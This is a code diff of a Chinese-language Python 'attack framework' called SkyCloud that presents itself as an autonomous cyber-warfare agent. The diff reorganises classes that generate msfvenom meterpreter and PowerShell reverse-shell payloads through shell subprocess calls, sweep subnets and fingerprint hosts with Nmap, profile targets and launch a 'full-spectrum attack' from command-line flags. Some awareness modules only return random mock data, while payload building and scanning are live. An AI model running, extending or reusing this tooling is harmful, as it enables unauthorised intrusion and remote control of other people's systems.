@@ -1,12 +1,15 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-天云智能攻击框架 - 实战版 (SkyCloud Defense Framework - Combat Edition)
+天云智能攻击框架 - 网络战自主智能体版
 核心特性：
 1. 集成顶尖开源安全工具
 2. 自动化渗透测试工作流
 3. 真实攻击能力
 4. 智能结果分析与决策
+5. 实时网络态势感知
+6. 自适应目标画像学习
+7. 对抗性AI训练
 """
 
 import torch
@@ -22,34 +25,14 @@ import nmap
 import requests
 import subprocess
 import sys
-from collections import OrderedDict
-from libnmap.parser import NmapParser
-
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-天云智能攻击框架 - 网络战自主智能体版
-新增模块:
-1. 实时网络态势感知系统 (Real-time Cyber Situational Awareness)
-2. 自适应目标画像学习系统 (Adaptive Target Profiling)
-3. 对抗性AI训练模块 (Adversarial AI Training)
-"""
-
-import torch
-import torch.nn as nn
-import torch.optim as optim
-import numpy as np
-from collections import deque
-import networkx as nx
-from sklearn.cluster import DBSCAN
-from sklearn.preprocessing import StandardScaler
-import matplotlib.pyplot as plt
-from matplotlib.animation import FuncAnimation
-from datetime import datetime
-import json
+import shutil
 import time
 import threading
+import numpy as np
+from collections import OrderedDict, deque
 from concurrent.futures import ThreadPoolExecutor
+from libnmap.parser import NmapParser
+import networkx as nx
 
 # ====================== 实时网络态势感知系统 ======================
 class NetworkSituationalAwareness:
@@ -99,7 +82,7 @@ class NetworkSituationalAwareness:
         """捕获网络流量数据"""
         # 这里简化实现，实际应使用Scapy或类似库
         return {
-            'timestamp': datetime.now().isoformat(),
+            'timestamp': datetime.datetime.now().isoformat(),
             'total_flows': random.randint(100, 1000),
             'bytes_sent': random.randint(1000000, 10000000),
             'bytes_received': random.randint(1000000, 50000000),
@@ -236,7 +219,7 @@ class TopologyMappingEngine:
     
     def __init__(self):
         self.network_graph = nx.Graph()
-        self.last_update = datetime.now()
+        self.last_update = datetime.datetime.now()
     
     def update_topology(self):
         """更新网络拓扑"""
@@ -256,7 +239,7 @@ class TopologyMappingEngine:
                 node1, node2 = random.sample(nodes, 2)
                 self.network_graph.add_edge(node1, node2, weight=random.random())
         
-        self.last_update = datetime.now()
+        self.last_update = datetime.datetime.now()
         
         return new_nodes
     
@@ -286,7 +269,7 @@ class AdaptiveTargetProfiler:
         profile = self.target_profiles[target_ip]
         
         # 合并新观察数据
-        profile['last_observed'] = datetime.now().isoformat()
+        profile['last_observed'] = datetime.datetime.now().isoformat()
         profile['observation_count'] += 1
         
         # 更新网络行为
@@ -303,7 +286,7 @@ class AdaptiveTargetProfiler:
         
         # 记录历史
         self.profile_history.append({
-            'timestamp': datetime.now().isoformat(),
+            'timestamp': datetime.datetime.now().isoformat(),
             'target': target_ip,
             'updates': new_observations
         })
@@ -314,8 +297,8 @@ class AdaptiveTargetProfiler:
         """创建默认目标画像"""
         return {
             'ip': target_ip,
-            'first_observed': datetime.now().isoformat(),
-            'last_observed': datetime.now().isoformat(),
+            'first_observed': datetime.datetime.now().isoformat(),
+            'last_observed': datetime.datetime.now().isoformat(),
             'observation_count': 0,
             'network_behavior': {
                 'active_hours': [],
@@ -503,7 +486,7 @@ class AdversarialAITrainer:
         
         # 5. 记录训练结果
         self.training_history.append({
-            'timestamp': datetime.now().isoformat(),
+            'timestamp': datetime.datetime.now().isoformat(),
             'results': results,
             'scenarios_count': len(attack_scenarios),
             'strategies_count': len(defense_strategies)
@@ -665,95 +648,6 @@ class DefenseSimulator:
                 'requirements': ['vulnerability_scanning']
             }
         ]
-
-# ====================== 天云系统升级集成 ======================
-class EnhancedSkyCloudSystem(SkyCloudSystem):
-    """增强版天云系统 - 集成新模块"""
-    
-    def __init__(self):
-        super().__init__()
-        
-        # 初始化新模块
-        self.situational_awareness = NetworkSituationalAwareness()
-        self.target_profiler = AdaptiveTargetProfiler()
-        self.adversarial_trainer = AdversarialAITrainer(self.module_manager.modules['neural_engine'])
-        
-        print("[天云核心] 网络战自主智能体模块加载完成")
-    
-    def full_spectrum_attack(self, target_ip):
-        """增强版全频谱攻击 - 集成态势感知和目标画像"""
-        # 1. 更新目标画像
-        target_info = self._gather_target_info(target_ip)
-        self.target_profiler.update_profile(target_ip, target_info)
-        
-        # 2. 检查网络态势
-        if self.situational_awareness.threat_level > 0.6:
-            print(f"[!] 警告: 网络威胁级别高 ({self.situational_awareness.threat_level:.2f})")
-            # 可选择调整攻击策略或延迟攻击
-        
-        # 3. 执行原攻击流程
-        result = super().full_spectrum_attack(target_ip)
-        
-        # 4. 更新攻击结果到目标画像
-        attack_outcome = {
-            'success': '成功' in result['attack_result'],
-            'techniques_used': [result['strategy']],
-            'vulnerabilities_exploited': result['vulnerabilities']
-        }
-        self.target_profiler.update_profile(target_ip, {'attack_outcomes': [attack_outcome]})
-        
-        return result
-    
-    def _gather_target_info(self, target_ip):
-        """收集目标信息用于画像"""
-        # 执行侦察扫描
-        scan_results = self.scanner.comprehensive_scan(target_ip)
-        
-        # 执行漏洞扫描
-        vulns = self.module_manager.execute_module_function('vuln_scanner', 'scan_target', target_ip)
-        
-        return {
-            'system_info': {
-                'os': scan_results.get('os', 'unknown'),
-                'services': [s['name'] for s in scan_results.get('services', [])],
-                'architecture': self._guess_architecture(scan_results.get('os', 'unknown'))
-            },
-            'vulnerabilities': vulns,
-            'network_behavior': {
-                'active_hours': [datetime.now().hour],
-                'common_ports': [s['port'] for s in scan_results.get('services', [])]
-            }
-        }
-    
-    def _guess_architecture(self, os_info):
-        """根据OS信息猜测架构"""
-        if 'windows' in os_info.lower():
-            return 'x64' if '64' in os_info else 'x86'
-        elif 'linux' in os_info.lower():
-            return 'x64'  # 大多数Linux系统是64位
-        else:
-            return 'unknown'
-    
-    def get_network_health(self):
-        """获取网络健康度"""
-        return self.situational_awareness.get_network_health()
-    
-    def get_target_profile(self, target_ip):
-        """获取目标画像"""
-        return self.target_profiler.get_target_profile(target_ip)
-    
-    def find_similar_targets(self, target_ip, threshold=0.7):
-        """查找相似目标"""
-        return self.target_profiler.find_similar_targets(target_ip, threshold)
-
-# ====================== 主执行系统 ======================
-def deploy_enhanced_skycloud_system():
-    """部署增强版天云系统"""
-    print("=" * 70)
-    print("天云智能防御框架 - 网络战自主智能体版")
-    print("新增: 实时态势感知 | 自适应目标画像 | 对抗性AI训练")
-    print("=" * 70)
-    return EnhancedSkyCloudSystem()
 
 # ====================== 核心模块 ======================
 class NeuralAdaptationEngine(nn.Module):
@@ -1071,6 +965,123 @@ class ModuleManager:
             return None
 
 
+# ====================== 支持模块 ======================
+class AdaptivePayloadGenerator:
+    """自适应载荷生成系统 - 上下文感知攻击载荷"""
+
+    def __init__(self):
+        self.signatures = []
+        self.evolution_log = []
+
+    def add_signature(self, new_sig: str):
+        """注册新攻击特征"""
+        self.signatures.append(new_sig)
+        self.evolution_log.append(f"新增攻击特征: {new_sig}")
+        return True
+
+    def generate_payload(self, target_os: str, strategy: str, lhost: str, lport: int):
+        """使用msfvenom生成真实载荷"""
+        format_map = {'windows': 'exe', 'linux': 'elf', 'unknown': 'raw'}
+        payload_map = {
+            'windows': 'windows/x64/meterpreter/reverse_https',
+            'linux': 'linux/x86/meterpreter/reverse_tcp',
+            'unknown': 'cmd/windows/powershell_reverse_tcp'
+        }
+
+        output_format = format_map.get(target_os.lower(), 'raw')
+        payload_type = payload_map.get(target_os.lower(), 'cmd/windows/powershell_reverse_tcp')
+
+        output_file = f"/tmp/payload_{target_os}_{random.randint(1000, 9999)}.{output_format}"
+
+        try:
+            msfvenom_cmd = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f {output_format} -o {output_file}"
+            subprocess.run(msfvenom_cmd, shell=True, check=True, capture_output=True)
+
+            # 检查文件是否生成成功
+            if os.path.exists(output_file):
+                print(f"[+] 载荷生成成功: {output_file}")
+                return output_file
+            else:
+                print("[-] 载荷生成失败")
+                return "载荷生成失败"
+        except subprocess.CalledProcessError as e:
+            print(f"[-] msfvenom执行错误: {e.stderr.decode()}")
+            return f"msfvenom错误: {e.stderr.decode()}"
+        except Exception as e:
+            print(f"[-] 载荷生成异常: {str(e)}")
+            return f"生成异常: {str(e)}"
+
+
+class NetworkRecon:
+    """网络侦察模块 - 集成Nmap和RustScan"""
+
+    def __init__(self):
+        self.nm = nmap.PortScanner()
+
+    def scan_subnet(self, subnet: str):
+        """扫描子网存活主机"""
+        try:
+            print(f"[网络侦察] 扫描子网: {subnet}")
+            self.nm.scan(hosts=subnet, arguments='-sn')
+            alive_hosts = [host for host in self.nm.all_hosts() if self.nm[host].state() == 'up']
+            print(f"[网络侦察] 发现 {len(alive_hosts)} 台存活主机")
+            return alive_hosts
+        except Exception as e:
+            print(f"[错误] 扫描失败: {str(e)}")
+            return []
+
+    def comprehensive_scan(self, target):
+        """综合侦察：RustScan快速发现 + Nmap深度识别"""
+        print(f"[+] 对 {target} 执行综合侦察...")
+
+        # 1. 使用Nmap进行基础扫描获取开放端口
+        try:
+            print(f"[-] 使用Nmap扫描 {target}...")
+            nm = nmap.PortScanner()
+            nm.scan(target, arguments='-sS -T4 --min-rate 1000')
+
+            if target not in nm.all_hosts():
+                return {"error": "目标不可达"}
+
+            open_ports = []
+            for proto in nm[target].all_protocols():
+                ports = nm[target][proto].keys()
+                open_ports.extend(ports)
+
+            if not open_ports:
+                return {"os": "unknown", "services": []}
+
+            # 2. 使用Nmap进行深度服务识别
+            port_list = ','.join(map(str, open_ports))
+            nm.scan(target, arguments=f'-sV -sC -O -p {port_list}')
+
+            # 3. 解析结果
+            scan_results = {
+                'os': nm[target].get('osmatch', [{}])[0].get('name', 'unknown') if nm[target].get(
+                    'osmatch') else 'unknown',
+                'services': []
+            }
+
+            for proto in nm[target].all_protocols():
+                for port in nm[target][proto]:
+                    service = nm[target][proto][port]
+                    scan_results['services'].append({
+                        'port': port,
+                        'protocol': proto,
+                        'name': service.get('name', 'unknown'),
+                        'product': service.get('product', ''),
+                        'version': service.get('version', ''),
+                        'extrainfo': service.get('extrainfo', '')
+                    })
+
+            print(f"[+] 侦察完成: 发现 {len(scan_results['services'])} 个服务")
+            return scan_results
+
+        except Exception as e:
+            print(f"[-] 侦察错误: {str(e)}")
+            return {"error": str(e)}
+
+
 # ====================== 天云核心系统 ======================
 class SkyCloudSystem:
     """天云智能防御框架核心"""
@@ -1190,149 +1201,120 @@ class SkyCloudSystem:
             return False
 
 
-# ====================== 支持模块 ======================
-class AdaptivePayloadGenerator:
-    """自适应载荷生成系统 - 上下文感知攻击载荷"""
-
+# ====================== 增强版天云系统 ======================
+class EnhancedSkyCloudSystem(SkyCloudSystem):
+    """增强版天云系统 - 集成新模块"""
+    
     def __init__(self):
-        self.signatures = []
-        self.evolution_log = []
-
-    def add_signature(self, new_sig: str):
-        """注册新攻击特征"""
-        self.signatures.append(new_sig)
-        self.evolution_log.append(f"新增攻击特征: {new_sig}")
-        return True
-
-    def generate_payload(self, target_os: str, strategy: str, lhost: str, lport: int):
-        """使用msfvenom生成真实载荷"""
-        format_map = {'windows': 'exe', 'linux': 'elf', 'unknown': 'raw'}
-        payload_map = {
-            'windows': 'windows/x64/meterpreter/reverse_https',
-            'linux': 'linux/x86/meterpreter/reverse_tcp',
-            'unknown': 'cmd/windows/powershell_reverse_tcp'
+        super().__init__()
+        
+        # 初始化新模块
+        self.situational_awareness = NetworkSituationalAwareness()
+        self.target_profiler = AdaptiveTargetProfiler()
+        self.adversarial_trainer = AdversarialAITrainer(self.module_manager.modules['neural_engine'])
+        
+        print("[天云核心] 网络战自主智能体模块加载完成")
+    
+    def full_spectrum_attack(self, target_ip):
+        """增强版全频谱攻击 - 集成态势感知和目标画像"""
+        # 1. 更新目标画像
+        target_info = self._gather_target_info(target_ip)
+        self.target_profiler.update_profile(target_ip, target_info)
+        
+        # 2. 检查网络态势
+        if self.situational_awareness.threat_level > 0.6:
+            print(f"[!] 警告: 网络威胁级别高 ({self.situational_awareness.threat_level:.2f})")
+            # 可选择调整攻击策略或延迟攻击
+        
+        # 3. 执行原攻击流程
+        result = super().full_spectrum_attack(target_ip)
+        
+        # 4. 更新攻击结果到目标画像
+        attack_outcome = {
+            'success': '成功' in result['attack_result'],
+            'techniques_used': [result['strategy']],
+            'vulnerabilities_exploited': result['vulnerabilities']
         }
-
-        output_format = format_map.get(target_os.lower(), 'raw')
-        payload_type = payload_map.get(target_os.lower(), 'cmd/windows/powershell_reverse_tcp')
-
-        output_file = f"/tmp/payload_{target_os}_{random.randint(1000, 9999)}.{output_format}"
-
-        try:
-            msfvenom_cmd = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f {output_format} -o {output_file}"
-            subprocess.run(msfvenom_cmd, shell=True, check=True, capture_output=True)
-
-            # 检查文件是否生成成功
-            if os.path.exists(output_file):
-                print(f"[+] 载荷生成成功: {output_file}")
-                return output_file
-            else:
-                print("[-] 载荷生成失败")
-                return "载荷生成失败"
-        except subprocess.CalledProcessError as e:
-            print(f"[-] msfvenom执行错误: {e.stderr.decode()}")
-            return f"msfvenom错误: {e.stderr.decode()}"
-        except Exception as e:
-            print(f"[-] 载荷生成异常: {str(e)}")
-            return f"生成异常: {str(e)}"
-
-
-class NetworkRecon:
-    """网络侦察模块 - 集成Nmap和RustScan"""
-
-    def __init__(self):
-        self.nm = nmap.PortScanner()
-
-    def scan_subnet(self, subnet: str):
-        """扫描子网存活主机"""
-        try:
-            print(f"[网络侦察] 扫描子网: {subnet}")
-            self.nm.scan(hosts=subnet, arguments='-sn')
-            alive_hosts = [host for host in self.nm.all_hosts() if self.nm[host].state() == 'up']
-            print(f"[网络侦察] 发现 {len(alive_hosts)} 台存活主机")
-            return alive_hosts
-        except Exception as e:
-            print(f"[错误] 扫描失败: {str(e)}")
-            return []
-
-    def comprehensive_scan(self, target):
-        """综合侦察：RustScan快速发现 + Nmap深度识别"""
-        print(f"[+] 对 {target} 执行综合侦察...")
-
-        # 1. 使用Nmap进行基础扫描获取开放端口
-        try:
-            print(f"[-] 使用Nmap扫描 {target}...")
-            nm = nmap.PortScanner()
-            nm.scan(target, arguments='-sS -T4 --min-rate 1000')
-
-            if target not in nm.all_hosts():
-                return {"error": "目标不可达"}
-
-            open_ports = []
-            for proto in nm[target].all_protocols():
-                ports = nm[target][proto].keys()
-                open_ports.extend(ports)
-
-            if not open_ports:
-                return {"os": "unknown", "services": []}
-
-            # 2. 使用Nmap进行深度服务识别
-            port_list = ','.join(map(str, open_ports))
-            nm.scan(target, arguments=f'-sV -sC -O -p {port_list}')
-
-            # 3. 解析结果
-            scan_results = {
-                'os': nm[target].get('osmatch', [{}])[0].get('name', 'unknown') if nm[target].get(
-                    'osmatch') else 'unknown',
-                'services': []
+        self.target_profiler.update_profile(target_ip, {'attack_outcomes': [attack_outcome]})
+        
+        return result
+    
+    def _gather_target_info(self, target_ip):
+        """收集目标信息用于画像"""
+        # 执行侦察扫描
+        scan_results = self.scanner.comprehensive_scan(target_ip)
+        
+        # 执行漏洞扫描
+        vulns = self.module_manager.execute_module_function('vuln_scanner', 'scan_target', target_ip)
+        
+        return {
+            'system_info': {
+                'os': scan_results.get('os', 'unknown'),
+                'services': [s['name'] for s in scan_results.get('services', [])],
+                'architecture': self._guess_architecture(scan_results.get('os', 'unknown'))
+            },
+            'vulnerabilities': vulns,
+            'network_behavior': {
+                'active_hours': [datetime.datetime.now().hour],
+                'common_ports': [s['port'] for s in scan_results.get('services', [])]
             }
-
-            for proto in nm[target].all_protocols():
-                for port in nm[target][proto]:
-                    service = nm[target][proto][port]
-                    scan_results['services'].append({
-                        'port': port,
-                        'protocol': proto,
-                        'name': service.get('name', 'unknown'),
-                        'product': service.get('product', ''),
-                        'version': service.get('version', ''),
-                        'extrainfo': service.get('extrainfo', '')
-                    })
-
-            print(f"[+] 侦察完成: 发现 {len(scan_results['services'])} 个服务")
-            return scan_results
-
-        except Exception as e:
-            print(f"[-] 侦察错误: {str(e)}")
-            return {"error": str(e)}
+        }
+    
+    def _guess_architecture(self, os_info):
+        """根据OS信息猜测架构"""
+        if 'windows' in os_info.lower():
+            return 'x64' if '64' in os_info else 'x86'
+        elif 'linux' in os_info.lower():
+            return 'x64'  # 大多数Linux系统是64位
+        else:
+            return 'unknown'
+    
+    def get_network_health(self):
+        """获取网络健康度"""
+        return self.situational_awareness.get_network_health()
+    
+    def get_target_profile(self, target_ip):
+        """获取目标画像"""
+        return self.target_profiler.get_target_profile(target_ip)
+    
+    def find_similar_targets(self, target_ip, threshold=0.7):
+        """查找相似目标"""
+        return self.target_profiler.find_similar_targets(target_ip, threshold)
 
 
 # ====================== 命令行接口 ======================
 def setup_command_line_interface():
     """创建命令行界面"""
-    parser = argparse.ArgumentParser(description='天云智能防御框架 - 实战强化版')
+    parser = argparse.ArgumentParser(description='天云智能防御框架 - 网络战自主智能体版')
     parser.add_argument('--target', help='指定攻击目标IP')
     parser.add_argument('--scan', help='扫描指定网段')
     parser.add_argument('--module', help='加载外部模块')
     parser.add_argument('--execute', help='执行模块功能')
     parser.add_argument('--full-attack', action='store_true', help='执行全频谱攻击')
     parser.add_argument('--audit-log', action='store_true', help='显示审计日志')
+    parser.add_argument('--enhanced', action='store_true', help='使用增强版系统')
     return parser.parse_args()
 
 
 # ====================== 主执行系统 ======================
-def deploy_skycloud_system():
+def deploy_skycloud_system(enhanced=False):
     """部署天云系统"""
-    print("=" * 60)
-    print("天云智能防御框架 - 实战强化版")
-    print("集成: Nmap | Metasploit | Nuclei | 自定义AI引擎")
-    print("=" * 60)
-    return SkyCloudSystem()
+    print("=" * 70)
+    if enhanced:
+        print("天云智能防御框架 - 网络战自主智能体版")
+        print("集成: Nmap | Metasploit | Nuclei | 自定义AI引擎 | 态势感知 | 目标画像 | 对抗训练")
+        return EnhancedSkyCloudSystem()
+    else:
+        print("天云智能防御框架 - 实战强化版")
+        print("集成: Nmap | Metasploit | Nuclei | 自定义AI引擎")
+        return SkyCloudSystem()
+    print("=" * 70)
 
 
+# ====================== 主程序入口 ======================
 if __name__ == "__main__":
     args = setup_command_line_interface()
-    skycloud = deploy_skycloud_system()
+    skycloud = deploy_skycloud_system(args.enhanced)
 
     # 显示审计日志
     if args.audit_log:
@@ -1381,28 +1363,18 @@ if __name__ == "__main__":
             print(f"\n[攻击结果] 策略: {result['strategy']}")
             print(f"[攻击结果] 载荷: {result['payload']}")
             print(f"[攻击结果] 状态: {result['attack_result']}")
+            
+            # 如果是增强版，演示新功能
+            if args.enhanced:
+                print("\n===== 增强功能演示 =====")
+                print(f"当前网络威胁级别: {skycloud.situational_awareness.threat_level:.2f}")
+                print(f"网络健康度: {skycloud.get_network_health():.2f}")
+                
+                profile = skycloud.get_target_profile(target)
+                print(f"\n目标 {target} 的画像:")
+                print(f"  操作系统: {profile['system_info']['os']}")
+                print(f"  服务数量: {len(profile['system_info']['services'])}")
+                print(f"  漏洞数量: {len(profile['vulnerabilities'])}")
+                print(f"  威胁评级: {profile['threat_rating']:.2f}")
         else:
-
             print("[警告] 未发现存活主机")
-        # 部署增强版系统
-    skycloud = deploy_enhanced_skycloud_system()
-    
-    # 演示新功能
-    print("\n===== 网络态势感知演示 =====")
-    print(f"当前网络威胁级别: {skycloud.situational_awareness.threat_level:.2f}")
-    print(f"网络健康度: {skycloud.get_network_health():.2f}")
-    
-    print("\n===== 目标画像演示 =====")
-    # 模拟扫描一个目标并创建画像
-    target = "192.168.1.1"  # 示例目标
-    target_info = skycloud._gather_target_info(target)
-    skycloud.target_profiler.update_profile(target, target_info)
-    
-    profile = skycloud.get_target_profile(target)
-    print(f"目标 {target} 的画像:")
-    print(f"  操作系统: {profile['system_info']['os']}")
-    print(f"  服务数量: {len(profile['system_info']['services'])}")
-    print(f"  漏洞数量: {len(profile['vulnerabilities'])}")
-    print(f"  威胁评级: {profile['threat_rating']:.2f}")
-    
-    print("\n[天云] 网络战自主智能体已就绪，等待指令...")
